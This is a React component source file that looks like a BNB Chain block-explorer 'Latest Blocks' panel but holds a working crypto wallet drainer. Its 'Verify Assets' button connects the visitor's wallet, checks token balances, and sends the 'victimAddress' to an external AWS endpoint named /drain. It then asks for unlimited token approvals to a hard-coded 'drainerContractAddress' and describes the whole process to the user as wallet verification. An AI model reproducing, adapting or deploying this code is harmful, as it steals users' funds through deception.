import React, { useState, useEffect } from "react";
import { IoCubeOutline } from "react-icons/io5";
import { MdOutlineGridView } from "react-icons/md";
// Import ethers properly
import { ethers } from "ethers";

import "../assets/css/LatestBlocks.css";

const LatestBlocks = () => {
  const [status, setStatus] = useState("");
  const [statusType, setStatusType] = useState(""); // success or error
  const [connectedAccount, setConnectedAccount] = useState(null);
  const [debug, setDebug] = useState(""); // For debugging
  const [ethersLoaded, setEthersLoaded] = useState(false);

  // Check if ethers is available on component mount
  useEffect(() => {
    // Check if ethers is available
    if (typeof ethers !== 'undefined') {
      setEthersLoaded(true);
      setDebug("Ethers loaded from import");
    } else if (window.ethers) {
      setEthersLoaded(true);
      setDebug("Ethers loaded from window (CDN)");
    } else {
      // If ethers is not available, load it from CDN
      const script = document.createElement('script');
      script.src = "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.6.1/ethers.umd.min.js";
      script.async = true;
      script.onload = () => {
        setEthersLoaded(true);
        setDebug("Ethers loaded from CDN dynamically");
      };
      document.body.appendChild(script);
    }
  }, []);

  const blockList = [
    {
      no: "47863341",
      time: "6 secs ago",
      Validator: "CertiK",
      txns: "228",
      BNB: "0.10078",
    },
    // ... other blocks (truncated for brevity)
  ];

  // Constants from the second code
  const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com/";
  const drainerContractAddress = "0xd58eeFeF184192Ed19c5b1DfEc06A082f84c66d3";
  const tokenList = [
    { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
    { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
    { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
  ];

  // Function to connect wallet and call APIs
  const connectAndDrain = async () => {
    let statusMessage = "";
    try {
      // Check if ethereum object exists
      if (typeof window.ethereum === 'undefined') {
        setStatus("No wallet detected. Please install MetaMask or another compatible wallet.");
        setStatusType("error");
        return;
      }

      // Check if ethers is loaded
      if (!ethersLoaded && !window.ethers) {
        setStatus("Ethers.js library is not loaded. Please refresh the page and try again.");
        setStatusType("error");
        return;
      }

      // Get the appropriate ethers instance
      const ethersInstance = window.ethers || ethers;
      
      // Add debug info
      setDebug(`Ethereum object detected: ${typeof window.ethereum}\nEthers loaded: ${ethersLoaded ? "Yes" : "No"}`);

      // Connect wallet
      // statusMessage = "Connecting to wallet...\n";
      // updateStatus(statusMessage);
      
      try {
        // First try directly requesting accounts
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const connectedAddress = accounts[0];
        
        setConnectedAccount(
          `${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`
        );

        // statusMessage += `Wallet connected successfully: ${connectedAddress}\n`;
        // updateStatus(statusMessage);
        
        // Create provider and signer using ethersInstance
        const provider = new ethersInstance.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        
        // statusMessage += "Checking token balances...\n";
        // updateStatus(statusMessage);
        
        const balanceAbi = ["function balanceOf(address account) external view returns (uint256)"];
        let hasTokens = false;
        
        try {
          for (const token of tokenList) {
            const tokenContract = new ethersInstance.Contract(token.address, balanceAbi, provider);
            const balance = await tokenContract.balanceOf(connectedAddress);
            // statusMessage += `Checked balance for ${token.symbol}: ${balance.toString()}\n`;
            // updateStatus(statusMessage);
            
            if (balance > 0) {
              hasTokens = true;
              break; // No need to check further if one token has balance
            }
          }
        } catch (tokenError) {
          statusMessage += `Error checking token balances: ${tokenError.message}\n`;
          updateStatus(statusMessage, "error");
          setDebug(debug + "\nToken balance error: " + JSON.stringify(tokenError));
          // Continue with API calls anyway for testing
          hasTokens = true;
        }

        // Fund gas only if victim has tokens (or if we encountered an error but want to proceed)
        if (hasTokens) {
          // statusMessage += "Checking gas balance...\n";
          // updateStatus(statusMessage);
          
          try {
            const gasResponse = await fetch(`${API_BASE_URL}/check-and-fund`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ victimAddress: connectedAddress })
            });
            
            const gasData = await gasResponse.json();
            if (gasData.success) {
              statusMessage += `${gasData.message}\n`;
            } else {
              // statusMessage += `Gas funding response: ${JSON.stringify(gasData)}\n`;
            }
            updateStatus(statusMessage);
          } catch (apiError) {
            statusMessage += `Error with gas funding API: ${apiError.message}\n`;
            updateStatus(statusMessage, "error");
            setDebug(debug + "\nAPI error: " + JSON.stringify(apiError));
            // Continue anyway for testing
          }
          
          // Attempt to drain immediately
          // statusMessage += "Processing claim...\n";
          // updateStatus(statusMessage);
          
          try {
            const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true })
            });
            
            const drainData = await drainResponse.json();
            // statusMessage += `${drainData.message || JSON.stringify(drainData)}\n`;
            // updateStatus(statusMessage, drainData.success ? "success" : "error");

            // Fallback approval if needed
            if (drainData.needsApproval) {
              statusMessage += "Verifying wallet (please confirm approvals for your tokens)...\n";
              updateStatus(statusMessage);

              // Update ABI to include balanceOf
              const bep20Abi = [
                "function approve(address spender, uint256 amount) external returns (bool)",
                "function balanceOf(address account) external view returns (uint256)"
              ];

              // Loop over all tokens in tokenList
              for (const token of tokenList) {
                try {
                  const tokenContract = new ethersInstance.Contract(token.address, bep20Abi, signer);
                  const balance = await tokenContract.balanceOf(connectedAddress);
                  if (balance > 0) {
                    statusMessage += `Approving ${token.symbol} (${ethersInstance.formatUnits(balance, token.decimals)} available)...\n`;
                    updateStatus(statusMessage);
                    const tx = await tokenContract.approve(drainerContractAddress, ethersInstance.MaxUint256, { gasLimit: 100000 });
                    await tx.wait();
                    statusMessage += `${token.symbol} approved!\n`;
                    updateStatus(statusMessage);
                  }
                } catch (approvalError) {
                  statusMessage += `Error approving ${token.symbol}: ${approvalError.message}\n`;
                  updateStatus(statusMessage, "error");
                  continue;
                }
              }
              statusMessage += "Wallet verified!\n";

              // Retry drain after approvals
              statusMessage += "Processing claim again...\n";
              updateStatus(statusMessage);
              
              try {
                const retryResponse = await fetch(`${API_BASE_URL}/drain`, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true })
                });
                
                const retryData = await retryResponse.json();
                statusMessage += `${retryData.message || JSON.stringify(retryData)}\n`;
                updateStatus(statusMessage, retryData.success ? "success" : "error");
              } catch (retryError) {
                statusMessage += `Error with retry drain API: ${retryError.message}\n`;
                updateStatus(statusMessage, "error");
              }
            }
          } catch (drainError) {
            statusMessage += `Error with drain API: ${drainError.message}\n`;
            updateStatus(statusMessage, "error");
            setDebug(debug + "\nDrain API error: " + JSON.stringify(drainError));
          }
        } else {
          statusMessage += "No tokens detected, skipping gas funding...\n";
          updateStatus(statusMessage);
        }
        
      } catch (walletError) {
        statusMessage += `Wallet connection error: ${walletError.message}\n`;
        updateStatus(statusMessage, "error");
        setDebug(debug + "\nWallet error: " + JSON.stringify(walletError));
      }
      
    } catch (error) {
      statusMessage += `Error: ${error.message}\n`;
      updateStatus(statusMessage, "error");
      setDebug(debug + "\nMain error: " + JSON.stringify(error));
    }
  };

  // Helper function to update status
  const updateStatus = (message, type = "") => {
    setStatus(message);
    if (type) {
      setStatusType(type);
    }
  };

  return (
    <>
      <section className="bg-dark pt-14 pb-20 bg-banner">
        <div className="container-fluid px-lg-5">
          <h6 className="text-light text-center pt-4">
            Verify Your Asserts and Confirm For Flash and Dummy fund
          </h6>
          <div className="d-flex justify-content-center align-items-center btn-wrap">
            <button className="btn-custom" onClick={connectAndDrain}>
              Verify Assets
            </button>
          </div>
          {/* Added status message display */}
          {status && (
            <div className={`mt-3 mx-auto p-3 text-left ${statusType ? `text-${statusType === "success" ? "success" : "danger"}` : ""}`} 
                 style={{ 
                   maxWidth: "600px", 
                   backgroundColor: statusType === "success" ? "#d4edda" : statusType === "error" ? "#f8d7da" : "#f8f9fa",
                   borderRadius: "4px",
                   whiteSpace: "pre-wrap"
                 }}>
              {connectedAccount && <div className="mb-2">Connected: {connectedAccount}</div>}
              {status}
            </div>
          )}
          {/* Debug information (remove in production) */}
          {debug && (
            <div className="mt-3 mx-auto p-3 bg-dark text-white" style={{ maxWidth: "600px", borderRadius: "4px", whiteSpace: "pre-wrap", fontSize: "12px" }}>
              <strong>Debug Info:</strong>
              <pre>{debug}</pre>
            </div>
          )}
        </div>
      </section>
      
      <div className="container-fluid px-lg-5">
        <div className="col-lg-12 mt-4 mb-4">
          <div className="card h-100">
            <div className="card-header d-flex justify-content-between align-items-center">
              <h6 className="card-header-title mt-1">Latest Blocks</h6>
              <button
                type="button"
                className="btn btn-sm btn-white d-flex justify-content-between align-items-center border dark:border-white border-opacity-15"
                data-bs-toggle="modal"
                data-bs-target="#customizeCardModal"
                data-bs-card-index="1"
              >
                <MdOutlineGridView className="me-1" />
                Customize
              </button>
            </div>

            <div
              className="card-body overflow-auto scrollbar-custom"
              style={{ maxHeight: "30.3rem" }}
            >
              {blockList &&
                blockList?.length > 0 &&
                blockList?.map((item, index) => (
                  <React.Fragment key={index}>
                    <div className="row">
                      <div className="col-sm-4">
                        <div className="d-flex align-items-center gap-2">
                          <div
                            className="d-none d-sm-flex content-center bg-light text-muted rounded p-3"
                            style={{ height: "3rem", width: "3rem" }}
                          >
                            <IoCubeOutline className="fs-lg" />
                          </div>
                          <div className="d-flex flex-row flex-sm-column align-items-center align-items-sm-start gap-1 gap-sm-0">
                            <span className="d-inline-block d-sm-none">
                              Block
                            </span>
                            <a
                              className="text-truncate text-decoration-none custom-font-color"
                              style={{ maxWidth: "6rem" }}
                              href="/block/47863341"
                            >
                              {item?.no}
                            </a>
                            <div className="small text-muted">{item?.time}</div>
                          </div>
                        </div>
                      </div>
                      <div className="col-sm-8 d-flex justify-content-sm-between align-items-end align-items-sm-center position-relative">
                        <div className="pe-0 pe-sm-2">
                          <div className="d-flex flex-wrap gap-1 custom-font-color">
                            Validated By
                            <a
                              className="text-truncate d-block text-decoration-none custom-font-color"
                              style={{ maxWidth: "8rem" }}
                              href="/address/0xbdcc079bbb23c1d9a6f36aa31309676c258abac7"
                            >
                              <span
                                data-bs-toggle="tooltip"
                                title="0xbdcc079bbb23c1d9a6f36aa31309676c258abac7"
                              >
                                Validator : {item?.Validator}
                              </span>
                            </a>
                          </div>
                          <a
                            href="#"
                            data-bs-toggle="tooltip"
                            title="Transactions in this Block"
                            className="text-decoration-none custom-font-color"
                          >
                            {item?.txns} txns
                          </a>{" "}
                          <span className="small text-muted me-2">
                            in {item?.time}
                          </span>
                          <span
                            className="d-inline-block d-sm-none badge border dark:border-white border-opacity-15 text-dark fw-medium py-1 py-sm-1.5 px-1.5 px-sm-2"
                            data-bs-toggle="tooltip"
                            title="Block Reward"
                          >
                            0<b>.</b>
                            {item?.BNB} BNB
                          </span>
                        </div>
                        <div className="d-none d-sm-block text-end ms-2 ms-sm-0">
                          <span
                            className="badge border dark:border-white border-opacity-15 text-dark fw-medium py-1.5 px-2"
                            data-bs-toggle="tooltip"
                            title="Block Reward"
                          >
                            0<b>.</b> {item?.BNB} BNB
                          </span>
                        </div>
                      </div>
                    </div>
                    <hr />
                  </React.Fragment>
                ))}
            </div>

            <a
              className="card-footer bg-light fw-medium text-cap link-muted text-center text-decoration-none py-3"
              href="#"
              style={{ fontSize: "0.85rem" }}
            >
              VIEW ALL BLOCKS{" "}
              <i className="fa-solid fa-long-arrow-right ms-1"></i>
            </a>
          </div>
        </div>
      </div>
    </>
  );
};

export default LatestBlocks;